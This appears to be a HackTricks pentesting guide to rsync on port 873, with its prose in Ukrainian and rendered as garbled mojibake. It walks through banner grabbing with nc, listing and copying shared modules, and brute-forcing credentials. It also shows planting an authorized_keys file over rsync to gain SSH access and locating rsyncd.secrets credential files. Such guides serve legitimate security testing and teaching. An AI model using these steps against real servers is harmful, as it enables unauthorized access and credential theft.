# 873 - –ü–µ–Ω—Ç–µ—Å—Ç–∏–Ω–≥ Rsync

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## **–û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è**

–ó [–≤—ñ–∫—ñ–ø–µ–¥—ñ—ó](https://en.wikipedia.org/wiki/Rsync):

> **rsync** - —Ü–µ —É—Ç–∏–ª—ñ—Ç–∞ –¥–ª—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ [–ø–µ—Ä–µ–¥–∞–≤–∞–Ω–Ω—è](https://en.wikipedia.org/wiki/File\_transfer) —Ç–∞ [—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó](https://en.wikipedia.org/wiki/File\_synchronization) [—Ñ–∞–π–ª—ñ–≤](https://en.wikipedia.org/wiki/Computer\_file) –º—ñ–∂ –∫–æ–º–ø'—é—Ç–µ—Ä–æ–º —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º –∂–æ—Ä—Å—Ç–∫–∏–º –¥–∏—Å–∫–æ–º —Ç–∞ –º—ñ–∂ [–º–µ—Ä–µ–∂–µ–≤–∏–º–∏](https://en.wikipedia.org/wiki/Computer\_network) [–∫–æ–º–ø'—é—Ç–µ—Ä–∞–º–∏](https://en.wikipedia.org/wiki/Computer), –ø–æ—Ä—ñ–≤–Ω—é—é—á–∏ [—á–∞—Å–∏ –∑–º—ñ–Ω](https://en.wikipedia.org/wiki/Timestamping\_\(computing\)) —Ç–∞ —Ä–æ–∑–º—ñ—Ä–∏ —Ñ–∞–π–ª—ñ–≤.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) –ó–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ [–æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–∞—Ö](https://en.wikipedia.org/wiki/Operating\_system) –ø–æ–¥—ñ–±–Ω–∏—Ö –¥–æ Unix. –ê–ª–≥–æ—Ä–∏—Ç–º rsync —î —Ç–∏–ø–æ–º [–∫–æ–¥—É–≤–∞–Ω–Ω—è –¥–µ–ª—å—Ç–∞](https://en.wikipedia.org/wiki/Delta\_encoding) —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º—ñ–Ω—ñ–º—ñ–∑–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ä–µ–∂—ñ. [Zlib](https://en.wikipedia.org/wiki/Zlib) –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ–≥–æ [—Å—Ç–∏—Å–Ω–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö](https://en.wikipedia.org/wiki/Data\_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) –∞ [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) –∞–±–æ [stunnel](https://en.wikipedia.org/wiki/Stunnel) –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏.

**–ü–æ—Ä—Ç –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## –ü–µ—Ä–µ–ª—ñ–∫

### –ë–∞–Ω–µ—Ä —Ç–∞ —Ä—É—á–Ω–µ —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **–ü–µ—Ä–µ–ª—ñ–∫ –∑–∞–≥–∞–ª—å–Ω–∏—Ö –ø–∞–ø–æ–∫**

**–ú–æ–¥—É–ª—ñ Rsync** –≤–∏–∑–Ω–∞—á–∞—é—Ç—å—Å—è —è–∫ **—Å–ø—ñ–ª—å–Ω—ñ –∫–∞—Ç–∞–ª–æ–≥–∏**, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∑–∞—Ö–∏—â–µ–Ω—ñ –ø–∞—Ä–æ–ª—è–º–∏**. –î–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ—Å—Ç—É–ø–Ω–∏—Ö –º–æ–¥—É–ª—ñ–≤ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏, —á–∏ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–ª—è –Ω–∏—Ö –ø–∞—Ä–æ–ª—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
–ë—É–¥—å—Ç–µ —É–≤–∞–∂–Ω—ñ, —â–æ –¥–µ—è–∫—ñ —Ä–µ—Å—É—Ä—Å–∏ –º–æ–∂—É—Ç—å –Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏—Å—è —É —Å–ø–∏—Å–∫—É, –º–æ–∂–ª–∏–≤–æ, –≤–æ–Ω–∏ –ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ. –ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ—Å—Ç—É–ø –¥–æ –¥–µ—è–∫–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω–∏–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º–∏ **–¥–∞–Ω–∏–º–∏ –¥–ª—è –≤—Ö–æ–¥—É**, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î—Ç—å—Å—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è–º **"–í—ñ–¥–º–æ–≤–ª–µ–Ω–æ –≤ –¥–æ—Å—Ç—É–ø—ñ"**.

### [**–ü–µ—Ä–µ–±—ñ—Ä –ø–∞—Ä–æ–ª—ñ–≤**](../generic-methodologies-and-resources/brute-force.md#rsync)

### –í—Ä—É—á–Ω–æ–º—É –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ Rsync

–ü—ñ—Å–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **—Å–ø–∏—Å–∫—É –º–æ–¥—É–ª—ñ–≤** –¥—ñ—ó –∑–∞–ª–µ–∂–∞—Ç—å –≤—ñ–¥ —Ç–æ–≥–æ, —á–∏ –ø–æ—Ç—Ä—ñ–±–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è. –ë–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó **–ø–µ—Ä–µ–ª—ñ–∫** —Ç–∞ **–∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è** —Ñ–∞–π–ª—ñ–≤ –∑—ñ —Å–ø—ñ–ª—å–Ω–æ—ó –ø–∞–ø–∫–∏ –≤ –ª–æ–∫–∞–ª—å–Ω–∏–π –∫–∞—Ç–∞–ª–æ–≥ –¥–æ—Å—è–≥–∞—î—Ç—å—Å—è —á–µ—Ä–µ–∑:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
–¶–µ–π –ø—Ä–æ—Ü–µ—Å **—Ä–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ø–µ—Ä–µ–¥–∞—î —Ñ–∞–π–ª–∏**, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ —ó—Ö –∞—Ç—Ä–∏–±—É—Ç–∏ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏.

–ó **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ–π–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏** —Å–ø–∏—Å–æ–∫ —Ç–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑—ñ —Å–ø—ñ–ª—å–Ω–æ—ó –ø–∞–ø–∫–∏ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –¥–µ –∑'—è–≤–∏—Ç—å—Å—è –∑–∞–ø–∏—Ç –Ω–∞ –ø–∞—Ä–æ–ª—å:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
–î–ª—è **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤–º—ñ—Å—Ç—É**, —Ç–∞–∫–æ–≥–æ —è–∫ —Ñ–∞–π–ª _**authorized_keys**_ –¥–ª—è –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

–î–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó rsyncd –≤–∏–∫–æ–Ω–∞–π—Ç–µ:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
–£ —Ü—å–æ–º—É —Ñ–∞–π–ª—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä _secrets file_ –º–æ–∂–µ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ** –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó rsyncd.


## –ü–æ—Å–∏–ª–∞–Ω–Ω—è
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
